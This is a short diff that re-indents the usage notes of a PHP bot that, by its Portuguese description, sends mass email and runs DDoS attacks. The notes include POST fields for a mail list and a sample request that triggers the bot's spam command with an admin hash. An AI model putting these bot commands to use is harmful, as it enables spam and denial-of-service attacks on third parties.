@@ -21,11 +21,11 @@ Bot em PHP utilizado para enviar emails em massa e realizar ataques DDoS (Negaç
               2 = Utiliza todas as funções (Envia repetido).
         data = null (default).
 
-      POST data:
-        maillist=...&subject=...&from=...&message=...
-       
-        phpBot.php?hash=admin&command=spam&flag=1&data=null
-     
+        POST data:
+          maillist=...&subject=...&from=...&message=...
+         
+          phpBot.php?hash=admin&command=spam&flag=1&data=null
+
  - Run file:
    command = run.
    flag = 1 (default).
